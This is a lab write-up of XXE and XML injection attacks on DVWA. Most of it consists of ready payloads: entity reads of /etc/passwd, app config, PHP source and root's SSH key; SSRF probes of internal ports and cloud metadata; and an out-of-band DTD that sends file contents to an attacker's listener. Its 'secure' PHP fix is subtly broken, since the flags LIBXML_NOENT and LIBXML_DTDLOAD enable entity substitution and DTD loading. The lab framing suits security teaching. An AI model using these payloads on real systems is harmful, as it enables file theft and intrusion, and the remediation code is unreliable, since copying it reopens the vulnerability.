# Lab Write-Up: XML Injection & XXE (XML External Entity)
**Date:** 2026-10-01  
**Author:** Adinath Dubile  
**Lab Environment:** DVWA (Damn Vulnerable Web Application)  
**Difficulty Levels Tested:** Low | Medium | High  
**Category:** Injection  
**OWASP Top 10:** A03:2021 – Injection / A05:2021 – Security Misconfiguration  

---

## 1. Introduction

XML External Entity (XXE) injection is a vulnerability that targets applications parsing XML input. When an XML parser is configured to process external entity references, an attacker can abuse this to read arbitrary files from the server, perform Server-Side Request Forgery (SSRF), or in some cases achieve Remote Code Execution (RCE). This is especially relevant for APIs, file upload functionality, and any DVWA-adjacent scenarios involving XML parsing.

**Goal of this lab:** Craft malicious XML payloads to demonstrate file disclosure and SSRF via XXE in a web application context.

---

## 2. Environment Setup

| Component        | Details                                |
|------------------|----------------------------------------|
| **Target App**   | DVWA + custom XML-parsing endpoint     |
| **Attacker OS**  | Kali Linux                             |
| **Tools Used**   | Burp Suite, curl                       |
| **Network**      | Local lab (NAT/Host-Only)              |
| **PHP Setting**  | `libxml_disable_entity_loader(false)`  |

---

## 3. Vulnerability Overview

### What is XXE?

XML allows defining entities — references that expand to predefined content. External entities (`SYSTEM` keyword) can reference files or URLs:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

When an XML parser processes this and returns `&xxe;`, it replaces it with the contents of `/etc/passwd`.

**Vulnerable PHP Code:**
```php
$xml = simplexml_load_string($_POST['xml']);  // Unsafe — external entities enabled
echo $xml->data;
```

---

## 4. Exploitation

### 4.1 Low Security Level (External Entities Enabled)

**Setup:** Use Burp Suite to find any XML-accepting endpoint in DVWA or a custom test endpoint.

#### Step 1 – Identify XML Input

Look for endpoints that accept XML:
- File upload accepting `.xml` files
- API endpoints with `Content-Type: application/xml`
- SOAP web services

**Test a basic XML submission:**
```bash
curl -X POST http://localhost/dvwa/xml_test.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><data><name>test</name></data>'
```

#### Step 2 – Basic XXE Test (Read /etc/passwd)

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <name>&xxe;</name>
</data>
```

**Send via Burp Repeater:**
```http
POST /dvwa/xml_test.php HTTP/1.1
Host: localhost
Content-Type: application/xml
Cookie: PHPSESSID=abc123; security=low

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><name>&xxe;</name></data>
```

**Response:**
```xml
<response>
  <output>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin...</output>
</response>
```

✅ XXE confirmed — `/etc/passwd` read.

#### Step 3 – Read Sensitive Configuration Files

**DVWA database config:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/dvwa/config/config.inc.php">]>
<data><value>&xxe;</value></data>
```

**SSH private key:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">]>
<data><value>&xxe;</value></data>
```

**PHP source code:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/html/dvwa/login.php">]>
<data><value>&xxe;</value></data>
```

#### Step 4 – SSRF via XXE

Use XXE to make the server request internal/external URLs:

**Scan internal services:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">]>
<data><value>&xxe;</value></data>
```

**Check if MySQL is running internally:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">]>
<data><value>&xxe;</value></data>
```

**Result:** Response content or timing reveals whether port 3306 is open internally.

**Probe other internal hosts:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.x.1/">]>
<data><value>&xxe;</value></data>
```

---

### 4.2 Medium Security Level (Filtering Basics)

**Setup:** Set security to **Medium**.

**Observation:** The parser may filter the `DOCTYPE` or `ENTITY` keywords directly.

#### Step 1 – Bypass via Encoding

If the filter is string-based, try encoding:

**UTF-16 encoded payload:**
```bash
# Convert payload to UTF-16 and send
python3 -c "
payload = '''<?xml version=\"1.0\" encoding=\"UTF-16\"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<data><value>&xxe;</value></data>'''
print(payload.encode('utf-16').hex())
"
```

**Parameter Entity Bypass:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY xxe '%file;'>">
  %eval;
]>
<data><value>&xxe;</value></data>
```

#### Step 2 – Out-of-Band XXE (Blind)

When results aren't returned in the response, use an OOB channel:

**On Kali, host a DTD file (`evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % oob "<!ENTITY send SYSTEM 'http://192.168.x.x:8081/?data=%file;'>">
%oob;
```

**Start listener:**
```bash
python3 -m http.server 8081
```

**XXE payload to fetch your DTD:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://192.168.x.x:8081/evil.dtd">
  %remote;
]>
<data><value>&send;</value></data>
```

**Result:** Server fetches DTD → reads `/etc/passwd` → sends contents to attacker's listener.

---

### 4.3 High Security Level (Hardened Parser)

**Setup:** Set security to **High**.

**Observation:** External entity loading is disabled server-side.

```php
// Hardened code
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($input);
```

#### Step 1 – XML Injection (Without External Entities)

Even without XXE, XML injection can break application logic:

**Original XML structure:**
```xml
<user><name>admin</name><role>user</role></user>
```

**Injected payload:**
```
admin</name><role>admin</role><name>admin
```

**Resulting XML:**
```xml
<user><name>admin</name><role>admin</role><name>admin</name><role>user</role></user>
```

If the parser takes the first `<role>` value → role becomes `admin`.

#### Step 2 – XInclude Attack

If `xi:include` is enabled, it can be used as an alternative to XXE:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 5. XXE Payload Cheatsheet

```xml
<!-- Basic file read -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- PHP wrapper (Base64 encode source) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

<!-- SSRF internal scan -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]>

<!-- Blind OOB exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
```

---

## 6. Findings Summary

| Security Level | Vulnerable | Vector                      | Data Extracted            |
|----------------|------------|-----------------------------|---------------------------|
| Low            | ✅ Yes     | Direct XXE entity injection | /etc/passwd, config files |
| Medium         | ✅ Yes     | OOB / parameter entities    | Blind exfiltration        |
| High           | ⚠️ Partial | XML injection / XInclude    | Logic manipulation        |

---

## 7. Impact Assessment

| Category       | Rating   |
|----------------|----------|
| **Severity**   | Critical |
| **CVSS Score** | 9.8      |
| **CIA Impact** | Confidentiality: High, Integrity: Medium, Availability: Medium |

**Business Impact:**
- Read of arbitrary sensitive files from the server
- SSRF to pivot into internal network
- Source code disclosure
- Cloud metadata theft (AWS: `http://169.254.169.254/latest/meta-data/`)

---

## 8. Remediation Recommendations

| Fix                                 | Description                                                     |
|-------------------------------------|-----------------------------------------------------------------|
| **Disable External Entities**       | `libxml_disable_entity_loader(true)` in PHP                    |
| **Use Modern XML Libraries**        | Prefer JSON over XML where possible                            |
| **Disable DTD Processing**          | Disable DOCTYPE declarations entirely                           |
| **Input Validation**                | Validate XML against a strict schema (XSD)                     |
| **Upgrade XML Libraries**           | Keep libxml, Expat, and other XML parsers up to date           |

**Secure PHP Fix:**
```php
// Before parsing any XML
libxml_disable_entity_loader(true);
$opts = LIBXML_NONET | LIBXML_NOENT | LIBXML_DTDLOAD;
$xml = simplexml_load_string($input, 'SimpleXMLElement', $opts);
```

---

## 9. References

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger – XXE Injection](https://portswigger.net/web-security/xxe)
- [PayloadAllTheThings – XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [OWASP Testing for XXE](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)

---

## 10. Proof of Concept (PoC) Summary

```
Target:    XML-parsing endpoint (DVWA context)
Payload:   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
Result:    Server read /etc/passwd and returned contents in XML response
SSRF:      SYSTEM "http://127.0.0.1:3306/" → confirmed internal MySQL port
Severity:  CRITICAL (CVSS 9.8)
```

---

*Write-up created for portfolio/educational purposes only. All testing performed in an isolated lab environment.*
